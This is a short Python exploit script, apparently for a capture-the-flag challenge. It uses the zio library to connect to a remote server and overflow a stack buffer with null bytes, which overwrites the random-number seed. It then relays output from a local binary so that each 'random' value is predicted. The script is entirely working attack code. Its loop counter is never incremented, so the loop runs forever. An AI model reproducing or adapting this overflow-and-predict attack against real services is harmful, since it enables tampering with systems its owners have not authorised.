# coding:utf-8
# 覆盖栈中随机数种子，预测随机值

from zio import *

io = zio(('101.200.187.112',9001),timeout=99999, 
        print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW,'blue'))


io.read_until(':')
io.write('\x00'*0x2C)

answer = zio('./a.out',timeout=99999, 
        print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW,'blue'))

i = 0
while i<=99:
	io.read_until_timeout()
	io.write(answer.readline())
